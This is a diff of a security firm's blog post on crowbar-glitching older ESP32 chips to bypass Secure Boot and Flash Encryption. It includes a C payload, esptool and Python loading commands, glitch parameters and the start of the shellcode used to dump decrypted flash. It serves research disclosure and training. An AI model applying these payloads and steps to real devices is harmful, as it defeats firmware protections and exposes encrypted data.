@@ -2,14 +2,14 @@
 <html lang="en-us">
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 	<meta charset="utf-8">
-	<title>Espressif ESP32: Using Crowbar Glitches to Bypass Encrypted Secure Boot</title>
+	<title>Espressif ESP32</title>
 
 	<!-- mobile responsive meta -->
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 	<meta name="description" content="Raelize provides top-notch embedded device security serrvices like consultancy, testing, research and training.">
 	
 	<meta name="author" content="Raelize B.V.">
-	<meta name="generator" content="Hugo 0.145.0">
+	<meta name="generator" content="Hugo 0.147.8">
 
 	<!-- plugins -->
 	
@@ -55,9 +55,7 @@
 <body id="body" data-spy="scroll" data-target=".navbar" data-offset="55">
   <div id="content">
     
-
-
-<section class="sticky-top navigation">
+ <section class="sticky-top navigation">
 	<div class="container">
 		<nav class="navbar navbar-expand-lg navbar-dark">
 			<a class="navbar-brand p-0" href="/">
@@ -118,49 +116,75 @@
 
 
 <section class="section">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 offset-lg-2 text-center">
-        <hr>
-        <h1>Espressif ESP32: Using Crowbar Glitches to Bypass Encrypted Secure Boot</h1>
-        <p>Monday, Feb 26, 2024</p>
-        <hr>
-        
-      </div>
-      <div class="col-lg-8 offset-lg-2">
-        <div class="post-single-content" background-color=0xff>
-          <p>In 2020, we <a href="https://raelize.com/blog/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">described</a> a Fault Injection (FI) attack on Espressif&rsquo;s ESP32 where we able to bypass Secure Boot and Flash Encryption using a single ElectroMagnetic (EM) glitch. Espressif acknowledged the attack and released an advisory (<a href="https://www.espressif.com/sites/default/files/advisory_downloads/Security%20Advisory%20CVE-2020-15048%2C%2013629%20EN%26CN.pdf">AR2020-001</a>) and requested a CVE (CVE-2020-13629). Note, this attack is only applicable on revision 0 and 1 of the ESP32, it&rsquo;s not applicable to revision 3.0 and revision 3.1, which we often refer to as ESP32 V3.</p>
-<p>When we started working on our <a href="https://raelize.com/taofi/">The Art of Fault Injection</a> training, we envisioned our students would reproduce most, if not all, of the FI attacks we performed Espressif&rsquo;s ESP32 SoC. We had no idea if this would actually be possible outside a lab environment, in a reasonable amount of time, and using a completely different FI technique. During our training, the students will not have access to <a href="https://www.riscure.com">Riscure</a>&rsquo;s <a href="https://www.riscure.com/products/em-fi-transient-probe/">EM-FI Transient Probe</a>. They will need to use <a href="https://www.newae.com/">NewAE</a>&rsquo;s ChipWhisperer-Husky in order to inject a so-called <a href="https://eprint.iacr.org/2016/810.pdf">Crowbar glitch</a> in the VCC signal(s).</p>
-<p>In this blog post, we describe our adventure(s) reproducing our attack using <a href="https://www.newae.com/">NewAE</a>&rsquo;s ChipWhisperer-Husky.</p>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 text-center">
+                <hr />
+                <h2>Espressif ESP32</h2>
+                
+                <h3>Using Crowbar Glitches to Bypass Encrypted Secure Boot</h3>
+                
+                <p>Wednesday, Jun 18, 2025</p>
+                <hr />
+                
+            </div>
+            <div class="col-lg-8 offset-lg-2">
+                <div class="post-single-content" background-color="0xff"><p>In 2020, we <a href="https://raelize.com/blog/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">described</a> a Fault Injection (FI) attack on Espressif&rsquo;s ESP32 where we able to bypass <code>Secure Boot</code> and <code>Flash Encryption</code> using an <code>electromagnetic (EM)</code> glitch. Espressif acknowledged the attack and released an advisory (<a href="https://www.espressif.com/sites/default/files/advisory_downloads/Security%20Advisory%20CVE-2020-15048%2C%2013629%20EN%26CN.pdf">AR2020-001</a>) and <code>CVE-2020-13629</code> was assigned. Note, this attack is only applicable on revision 0 and 1 of the <code>ESP32</code>. The attack is not possible on revision 3.0 and revision 3.1, which we often refer to as <code>ESP32 V3</code>. Note, we also bypassed <code>Secure Boot</code> and <code>Flash Encryption</code> of this latest version using a single EM glitch (see our <a href="http://localhost:1313/upload/research/2024/woot24-delvaux.pdf">paper</a> at <a href="https://www.usenix.org/conference/woot24">Usenix WOOT 24</a>).</p>
+<p>When we started working on our <a href="https://raelize.com/taofi/">The Art of Fault Injection (TAoFI)</a> training, we envisioned our students would reproduce most, if not all, of the EMFI attacks we performed on Espressif&rsquo;s ESP32 SoC. We had no idea if this would actually be possible outside a lab environment, in a reasonable amount of time, and using a completely different FI technique. During our training, the students will not have access to <a href="https://www.riscure.com">Riscure</a>&rsquo;s <a href="https://www.riscure.com/products/em-fi-transient-probe/">EM-FI Transient Probe</a>. They will need to use <a href="https://www.newae.com/">NewAE</a>&rsquo;s <a href="https://www.newae.com/product-page/chipwhisperer-husky">ChipWhisperer-Husky</a> in order to inject a so-called <a href="https://eprint.iacr.org/2016/810.pdf">Crowbar glitch</a> in the VCC signal(s) wired into the ESP32 SoC. Using a different technique may trigger a different (hardware) vulnerability, and, hence, different type of faults.</p>
+<p>In this blog post, we describe our adventure(s) reproducing our EMFI attack using <a href="https://www.newae.com/">NewAE</a>&rsquo;s <a href="https://www.newae.com/product-page/chipwhisperer-husky">ChipWhisperer-Husky</a>.</p>
+<p>We have organized the content in the following sections:</p>
+<ul>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#background">Background</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#setup">Setup</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#identifying-the-vulnerability">Identifying the vulnerability</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#exploiting-the-vulnerability">Exploiting the vulnerability</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#why-does-this-work">Why does this work?</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#takeaways">Takeaways</a></li>
+<li><a href="/blog/espressif-systems-esp32-using-a-crowbar-glitch-to-bypass-encrypted-secure-boot/#conclusion">Conclusion</a></li>
+</ul>
+<p>We hope you appreciate this blog post, have fun! :)</p>
 <h2 id="background">Background</h2>
-<p>For our attack, we leveraged the UART bootloader, implemented in the ROM code, which cannot be disabled. This UART bootloader, which can be started after reset by setting strap pins, supports useful functionality, such as accessing flash and executing arbitrary code. There is a dedicated OTP bit (i.e., DISABLE_DL_DECRYPT) to bypass the flash encryption module when the flash is accessed in UART bootloader mode. This means that, even though you can execute arbitrary code in UART Bootloader Mode, you cannot access the decrypted flash contents.</p>
-<p>Besides the UART bootloader, we also leveraged a characteristic of SRAM, where data is retained as long as power is being supplied. Resetting the ESP32 using a Watchdog reset allowed us to retain the data that was stored in the SRAM using the UART bootloader. Using a glitch, we were able to load this retained data in the Program Counter (PC) register of the CPU, in order to jump to the code implementing the UART bootloader. This allowed us to use the functionality provided by the UART bootloader while the chip is in Normal Mode (i.e., we can access the flash contents unencrypted).</p>
-<p>To summarize the steps required to perform the attack:</p>
+<hr>
+<p>For our attack, we leveraged the <code>UART bootloader</code>, implemented in the ROM code, which cannot be disabled. This <code>UART bootloader</code> can be started after reset by setting strap pins and supports useful functionality, such as accessing flash and executing arbitrary code.  A dedicated <code>OTP</code> bit (i.e., <code>DISABLE_DL_DECRYPT</code>) allows bypassing the flash encryption module while being in <em>Bootloader Mode</em>, effectively disabling transparent decryption of the Flash content. Basically, even though arbitrary code can be executed in <em>Bootloader Mode</em>, accessing flash content is prevented.</p>
+<p>Besides the <code>UART bootloader</code>, we also leveraged a characteristic of SRAM. We found that SRAM data is retained when the <code>ESP32</code> is reset using a (warm) <code>Watchdog</code> reset and power is being supplied during reset. This allowed us to retain the data stored in the SRAM while being in the <code>UART bootloader</code> and have it available after the <code>ESP32</code> rebooted in its Normal Mode. Using a glitch, we were able to load this retained data in the <code>Program Counter (PC)</code> register of the CPU jump to the function in <code>ROM code</code> that implements the <code>UART bootloader</code>. This allowed us to use the functionality provided by the <code>UART bootloader</code> while the chip is in <em>Normal Mode</em>, which allowed us to access the unencrypted flash contents.</p>
+<p>To summarize the steps required to execute the <code>UART bootloader</code> in <em>Normal Mode</em>:</p>
 <ol>
-<li>Set strap pin GPIO0 to 0 to boot the chip in UART Bootloader Mode</li>
-<li>Use UART bootloader to load and execute a payload in SRAM that consists of:
-<ol>
-<li>Code section with functionality to reset the chip with a watchdog reset</li>
-<li>Data section consisting of pointers pointing to the UART bootloader</li>
-</ol>
+<li>Set <code>PROGRAM</code> pin to <code>0</code> and use <code>RESET</code> pin to boot the chip in <em>Bootloader Mode</em></li>
+<li>Use the <code>UART bootloader</code> to load and execute a payload in <code>SRAM</code> that consists of:
+<ul>
+<li>Code section with a command to perform a Watchdog reset</li>
+<li>Data section consisting of pointers towards the jump location</li>
+</ul>
 </li>
-<li>Set strap pin GPIO0 to 1 to boot the chip in Normal Mode</li>
-<li>Send the command to reset the chip using the Watchdog</li>
-<li>Inject a glitch while the ROM code is copying the original bootloader</li>
-<li>On success a pointer from the data section is loaded into the PC register</li>
-<li>Use the UART bootloader in Normal Mode to access the flash or execute code</li>
+<li>Set <code>PROGRAM</code> pin to <code>1</code> to enter <em>Normal Mode</em> after the <code>Watchdog</code> reset</li>
+<li>Send the command to perform the <code>Watchdog</code> reset</li>
+<li>Inject a glitch while the ROM code is copying the original bootloader from external flash</li>
+<li>On success, a pointer from SRAM is loaded into the PC of the CPU</li>
 </ol>
-<p>As the above attack was originally performed using an EM glitch, we had to verify if it was also reproducible using a so-called crowbar glitch. In this blog we describe our journey reproducing the original attack using NewAE&rsquo;s tooling. Moreover, we also describe an improvement over the original attack where we execute arbitrary code to access the flash instead of reusing the UART bootloader functionality in the ROM code.</p>
-<h2 id="setup">Setup</h2>
-<p>We used NewAE&rsquo;s ChipWhisperer-Husky to inject the Crowbar glitch into the VDD3P3_CPU and VDD3P3_RTC domains of the ESP32. We used a Raspberry Pi Pico to drive our Fault Injection statemachine as this allows us to configure more complex triggers. The standard triggering mechanism of the ChipWhisperer-Husky is somewhwat limited but we are confident that this will change for future versions of the firmware.</p>
-<p>TODO_INSERT_PICTURE_OF_THE_SETUP_DIAGRAM</p>
-<p>TODO_INSERT_PICTURE_OF_THE_SETUP_REAL</p>
-<p>Besides timing the glitch, the Raspberry Pi Pico is also used to reset the ESP32 into UART bootloader mode. We used Espressif&rsquo;s ESP-Prog, which is designed around a FTDI FT2232H chip, to communicate with the target.</p>
-<h2 id="re-identifying-the-vulnerability">(Re-)identifying the vulnerability</h2>
-<p>The first step was to identify if we can introduce the right type of fault using a Crowbar glitch. One thing we could have done is trying to set the PC register to 0x41414141, resulting in an exception, which we can use if we can trigger the vulnerability in the same manner. However, we decided to take a more elegant approach by jumping to a function in ROM that prints something on the serial interface without any crash. There is a built-in command interpreter inside the ROM code which is perfect for our purposes.</p>
+<p>As the above attack was originally performed using an EM glitch, we had to verify if it was also possible to reproduce it with a <code>Crowbar</code> glitch. In this blog, we describe our journey reproducing the original attack using NewAE&rsquo;s tooling.</p>
+<p>Moreover, we also describe an improvement over the original attack, where we execute arbitrary code to access the unencrypted flash contents, instead of reusing the <code>UART bootloader</code> functionality in the <code>ROM code</code>.</p>
+<h2 id="target--tooling">Target &amp; Tooling</h2>
+<hr>
+<p>The target is Espressif&rsquo;s ESP32 SoC, for which we created a <a href="https://github.com/raelize/TAoFI-Target">custom</a> target board for our training. It has Secure Boot and Flash Encryption enabled, along with several other security features.</p>
+<p>We used NewAE&rsquo;s <code>ChipWhisperer-Husky</code> to inject the Crowbar glitch into the <code>VDD3P3_CPU</code> and <code>VDD3P3_RTC</code> domains of the ESP32. We used a Raspberry Pi Pico to drive our Fault Injection state machine as this allows us to configure more complex triggers. The standard triggering mechanism of the <code>ChipWhisperer-Husky</code> is somewhat limited, but we are confident this will ber improved in future versions of the firmware.</p>
+<p>A diagram of the setup is shown below. Yes, all those wires are required. It often results in the spaghetti of wires shown below in the actual photo of a (clean) setup. Hence, it would not be the first time we, or our students, misplace a wire or two while building the setup.</p>
+<p style="text-align:center;">
+    <img src="/img/esp32/crowbar/taofi_setup_for_attackencrypted.png" style="max-width: 80%; width: 600px">
+    <figcaption>Diagram of the setup using NewAE's ChipWhisperer-Husky</figcaption>
+</p>
+<p>An actual photo of the setup is shown below. Note, the lab power supply is used to lower the voltage on the <code>VDD3P3_CPU</code> and <code>VDD3P3_RTC</code> signals as we have had less luck glitching this target at the 3.3 volts recommended by Espressif.</p>
+<p style="text-align:center;">
+    <img src="/img/esp32/crowbar/setup.png" style="max-width: 80%; width: 600px">
+    <figcaption>Actual photo of the setup using NewAE's ChipWhisperer-Husky</figcaption>
+</p>
+<p>Besides timing the glitch, the Raspberry Pi Pico is also used to reset the ESP32 into <em>Bootloader Mode</em>. We used Espressif&rsquo;s <a href="https://docs.espressif.com/projects/esp-iot-solution/en/latest/hw-reference/ESP-Prog_guide.html">ESP-Prog</a>, designed around a FTDI FT2232H chip, to communicate with the target.</p>
+<h2 id="identifying-the-vulnerability">Identifying the vulnerability</h2>
+<hr>
+<p>The first step was to identify if we can introduce the right type of fault using a Crowbar glitch.</p>
+<p>During the identification of the original attack, we jumped to an invalid address, which resulted in an exception. We decided to take a similar approach by trying to load <code>0x41414141</code> into the PC register of the CPU. This is, indeed, an invalid address and should result in an easily identifiable exception.</p>
 <h4 id="payload">Payload</h4>
-<p>The source code for the SRAM payload that we used for identifying the vulnerability is shown below. It implements a command handler with a single command, which is used to trigger a Watchdog reset.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define a &#34;.word 0x4005a980;&#34;
+<p>Below, we show the source code for the SRAM payload we used for identifying the vulnerability. It implements a command handler with a single command, which is used to trigger a <code>Watchdog</code> reset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define a &#34;.word 0x41414141;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define t a a a a a a a a a a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define h t t t t t t t t t t
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define d h h h h h h h h h h
@@ -185,10 +209,16 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* wait here until the watchdog reset kicks in*/</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The pointers, in total 1000, point to the built-in command interpreter in the ROM code. This functionality prints <code>Falling back to built-in command interpreter.\n</code> on the serial interface, which we can use to identify that we are success (i.e., we can load an arbitrary value into the PC register of the CPU).</p>
-<p>The payload is build using Espressif&rsquo;s ESP-IDF as is shown below.</p>
+</span></span></code></pre></div><p>The pointers, in total 1000, are set to <code>0x41414141</code>. When this value gets loaded into the PC register of the CPU due to the effect of a glitch, an exception is printed on the serial interface, allowing us to identify that a successful glitch has occurred.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Fatal exception <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>: IllegalInstruction
+</span></span><span style="display:flex;"><span>    epc1<span style="color:#f92672">=</span>0x41414141,
+</span></span><span style="display:flex;"><span>    epc2<span style="color:#f92672">=</span>0x00000000,
+</span></span><span style="display:flex;"><span>    epc3<span style="color:#f92672">=</span>0x00000000,
+</span></span><span style="display:flex;"><span>    excvaddr<span style="color:#f92672">=</span>0x00000000,
+</span></span><span style="display:flex;"><span>    depc<span style="color:#f92672">=</span>0x00000000
+</span></span></code></pre></div><p>The payload is build using Espressif&rsquo;s ESP-IDF framework as is shown below.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ idf.py bootloader
-</span></span></code></pre></div><p>The resulting binary looks is shown below. As you can see the pointers that are injected into the binary start at offset 0x13c and are as expected 4-byte aligned.</p>
+</span></span></code></pre></div><p>The resulting binary looks is shown below. As visible in the hexdump, the pointers injected into the binary start at offset <code>0x13c</code> and are, as expected, 4-bytes aligned.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hexdump -C build/bootloader/bootloader.bin
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  e9 <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">10</span> 1c <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">40</span>  ee <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |.......@........|
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  <span style="color:#ae81ff">00</span> 8f <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> ff 3f <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |...........?T...|
@@ -209,17 +239,17 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000100  98 3a 00 00 8c 80 f4 3f  80 f8 01 c0 d0 8f 00 40  |.:.....?.......@|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000110  a4 92 00 40 36 41 00 81  fd ff e0 08 00 81 fc ff  |...@6A..........|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000120  e0 08 00 4c 18 87 9a 13  81 f5 ff 91 f5 ff 99 08  |...L............|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000130  81 f5 ff 91 f5 ff 99 08  06 ff ff 00 80 a9 05 40  |................|
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000140  80 a9 05 40 80 a9 05 40  80 a9 05 40 80 a9 05 40  |................|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000130  81 f5 ff 91 f5 ff 99 08  06 ff ff 00 41 41 41 41  |............AAAA|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000140  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000010d0  80 a9 05 40 80 a9 05 40  80 a9 05 40 06 16 fc 00  |................|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000010d0  41 41 41 41 41 41 41 41  41 41 41 41 06 16 fc 00  |AAAAAAAAAAAA....|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000010e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000010f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 ad  |................|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00001100  3a 68 92 e5 8e 53 dc b0  8c fa 77 c9 34 5e 1e 3d  |:h...S....w.4^.=|
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00001110  ff 52 48 c7 22 c2 ea c6  48 b2 59 fe 06 8a 1c 6d  |.RH.&#34;</span>...H.Y....m|
 </span></span></code></pre></div><p>Then, we use Espressif&rsquo;s <code>esptool.py</code> to load the payload into SRAM using the ESP32&rsquo;s Download Mode.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ esptool.py --no-stub load_ram build/bootloader/bootloader.bin
-</span></span></code></pre></div><p>We like to do this directly from Python, including sending the command to trigger the Watchdog reset, which can be done as follows.</p>
+</span></span></code></pre></div><p>Even though we could run the <code>esptool.py</code> from a shell, we decided to do it directly from Python, which is not actually very difficult as the tool is made in Python as well. Hence, we can import is as a module as is shown below.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> esptool
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># send bootloader to ram</span>
@@ -230,9 +260,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># connect to the serial interface and send the command</span>
 </span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> serial<span style="color:#f92672">.</span>Serial(<span style="color:#e6db74">&#39;/dev/ttyUSB0&#39;</span>, baudrate<span style="color:#f92672">=</span><span style="color:#ae81ff">115200</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
 </span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
-</span></span></code></pre></div><p>Now we need to figure out when to inject a glitch in order to load one of the pointers into the PC register of the CPU.</p>
+</span></span></code></pre></div><p>Now it&rsquo;s time to figure out when to inject a glitch and have one of the pointers stored in SRAM, loaded into the PC register of the CPU.</p>
 <h4 id="timing">Timing</h4>
-<p>As the payload that we load into SRAM is based on the original ESP32 bootloader, it actually consists of similar sections. As a result, the text section (i.e., instructions) of the SRAM payload is loaded to the same address as the original bootloader (i.e., <code>0x40080400</code>). This shown by running <code>extensa-esp32-elf-readelf</code> in the RAM payload as is shown below.</p>
+<p>As the payload that we load into SRAM is based on the original ESP32 bootloader, it actually consists of similar sections. As a result, the text section (i.e., instructions) of the SRAM payload is loaded to the same address as the original bootloader (i.e., <code>0x40080400</code>). This is visible by running <code>extensa-esp32-elf-readelf</code> onto the RAM payload as is shown below.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ extensa-esp32-elf-readelf -l build/bootloader/bootloader.elf
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Elf file type is EXEC <span style="color:#f92672">(</span>Executable file<span style="color:#f92672">)</span>
@@ -247,37 +277,59 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> Section to Segment mapping:
 </span></span><span style="display:flex;"><span>  Segment Sections...
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">00</span>     .dram0.rodata 
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">01</span>     .iram_loader.text 
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">02</span>     .iram.text .iram.text 
-</span></span></code></pre></div><p>We want to inject the glitch when the ROM code is copying the bootloader from flash on top of the pointers that are already in SRAM (i.e., due to the data retention). The flash activity (e.g., on the SPI CS signal) can be used effectively time the moment at which we want to inject the glitch.</p>
-<p>TODO_INSERT_PICTURE_OF_FLASH_ACTIVITY</p>
-<p>This is exactly what we also used during the original attack. We decided to inject the glitch in a TODO microsecond window starting from the moment the ROM code is copying the bootloader from flash.</p>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">00</span>     .dram0.rodata
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">01</span>     .iram_loader.text
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">02</span>     .iram.text .iram.text
+</span></span></code></pre></div><p>We aim to inject the glitch when the ROM code is copying the bootloader from flash on top of the pointers that are already in SRAM (i.e., due to the data retention). The flash activity (e.g., on the SPI CS signal) can be used to effectively time the moment we want to inject the glitch.</p>
+<p>We decided to inject the glitch in a 161,000 nanoseconds window, starting from the moment the ROM code is copying the bootloader code from flash.</p>
 <h4 id="results">Results</h4>
-<p>After TODO experiments, where we randomized the Glitch Length (i.e., the duration VDD3P3_CPU and VDD3P3_RTC are pulled to ground) between TODO ns and TODO ns. This yielded the results shown in the table below.</p>
-<p>TODO_INSERT_TABLE_OF_RESULTS</p>
-<p>We use our <a href="">TAoFI-Analyzer</a> to plot all experiments. We assign dedicated colors to several types of distinctive experiments.</p>
-<p>TODO_INSERT_PLOT_OF_RESULTS</p>
-<p>As is shown in the plot, there are several moment in time, that for a given glitch length, we are successful (i.e., we are able to load one of the pointers into the PC register of the CPU).</p>
-<p>When we narrow down the glitch parameters, namely the Glitch Delay and Glitch Length, we are able to obtain a success rate of almost 100%. In other words, we are able to load an arbitrary 32-bit value into the PC register of the ESP32, even though Secure Boot and Flash Encryption are enabled.</p>
+<p>We performed <code>~8000</code> experiments, which took <code>~3h</code>, using the following glitch parameters:</p>
+<ul>
+<li><code>Glitch Length</code> between <code>1,000</code> ns and <code>5,000</code> ns</li>
+<li><code>Glitch Delay</code> between <code>0</code> ns and <code>161,000</code> ns</li>
+</ul>
+<p>We use our <a href="https://github.com/raelize/TAoFI-Analyzer">TAoFI-Analyzer</a> to plot all experiments. We observed one single successful glitch around <code>73,000</code> ns after the trigger. Moreover, we clearly see a repetitive pattern, which can be related to the activity with the external flash chip.</p>
+<p style="text-align:center;">
+    <a href="/img/esp32/crowbar/attack_encrypted_identify_1.png">
+        <img src="/img/esp32/crowbar/attack_encrypted_identify_1.png" style="max-width: 80%; width: 600px">
+    </a>
+    <figcaption>Glitching between 0 and 161,000 after the start of the bootloader copy</figcaption>
+</p>
+<p>We decided to explore this area further, which resulted in <code>15</code> more successful glitches in two distinct moments in time, namely around <code>71,800</code> ns and around <code>74,000</code> ns.</p>
+<p style="text-align:center;">
+    <a href="/img/esp32/crowbar/attack_encrypted_identify_2.png">
+        <img src="/img/esp32/crowbar/attack_encrypted_identify_2.png" style="max-width: 80%; width: 600px">
+    </a>
+    <figcaption>Glitching between 70,000 and 75,000 after the start of the bootloader copy</figcaption>
+</p>
+<p>We then decided to explore the area around <code>74,000</code> ns in more detail. As you can see, the success rate in the bottom right corner is significant.</p>
+<p style="text-align:center;">
+    <a href="/img/esp32/crowbar/attack_encrypted_identify_3.png">
+    <img src="/img/esp32/crowbar/attack_encrypted_identify_3.png" style="max-width: 80%; width: 600px">
+    </a>
+    <figcaption>Glitching between 73950 and 74000 after the start of the bootloader copy</figcaption>
+</p>
+<p>When we tune the glitch parameters to this region, the success rate increases to 34.2%, which means we observe a successful glitch every 3 experiments. In other words, once every 3 experiments, we are able to load an arbitrary pointer into the PC register of the CPU, even though <code>Secure Boot</code> and <code>Flash Encryption</code> are both enabled.</p>
+<p>Interestingly, some of our students demonstrated during our <a href="https://raelize.com/taofi/">TAoFI</a> training that it&rsquo;s possible to get results very close to <code>100%</code>. Hence, we could probably increase the success rate for this target as well.</p>
 <p>In the remainder of this blog post we will describe how we can use this vulnerability in order to bypass Secure Boot (i.e., execute unsigned code) and bypass Flash Encryption (i.e., access unencrypted flash).</p>
 <h2 id="exploiting-the-vulnerability">Exploiting the vulnerability</h2>
-<p>During our original attack, we jumped to the UART bootloader in flash once we obtained control of the PC register of the CPU. Normally, when you enter this UART bootloader by strap-pin, you cannot access the flash contents unencrypted. However, as we jump to the UART bootloader functionality during a normal boot, the hardware that normally restricts the UART bootloader, is not active.</p>
-<p>Even though this approach is effective, it would be better to simply execute arbitrary code in order to access the flash contents unencrypted. We decided to leverage the retained data in SRAM, that we also use for the pointers, for a code payload. This allows us to execute an arbitrary code payload after we obtained control of the PC register of the CPU.</p>
+<hr>
+<p>In our <a href="/blog/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">original attack</a>, once we obtained control of the PC register of the CPU, we jumped to the UART bootloader in ROM code. Normally, when the UART bootloader is started using a strap-pin during boot, it is executed in <em>Bootloader Mode</em>, from which it&rsquo;s impossible to read out the unencrypted data from external flash. However, as we jumped to the UART bootloader in <em>Normal Mode</em>, thanks to a successful glitch, we were able to access this data without restrictions. Even though this approach was effective, it would be more powerful to simply execute arbitrary code in order to access the unencrypted flash contents. Hence, we decided to take this approach for our <a href="https://raelize.com/taofi/">TAoFI</a> training.</p>
+<p>In the original attack we use the retained data characteristics of SRAM for storing pointers, which eventually end up in the PC register of the CPU. We leverage the same mechanism to store a shellcode in the SRAM, using the UART bootloader, which then, later on, is executed in <em>Normal Mode</em> due to our glitch.</p>
 <h4 id="shellcode">Shellcode</h4>
-<p>The shellcode that we use to access flash reuses the <code>ets_printf</code> function in the ROM code. We store 16 bytes in SRAM at address <code>0x5000_0000</code> consisting of the following:</p>
+<p>The shellcode we use to access flash reuses the <code>ets_printf</code> function in ROM code to print the unencrypted data on the serial interface. We store the following 16 bytes in SRAM at address <code>0x5000_0000</code>:</p>
 <ul>
 <li><code>&quot;\x54\x7d\x00\x40&quot;</code>: addr of ets_printf() in ROM code</li>
 <li><code>&quot;\x0c\x00\x00\x50&quot;</code>: addr of &ldquo;%x\n&rdquo;</li>
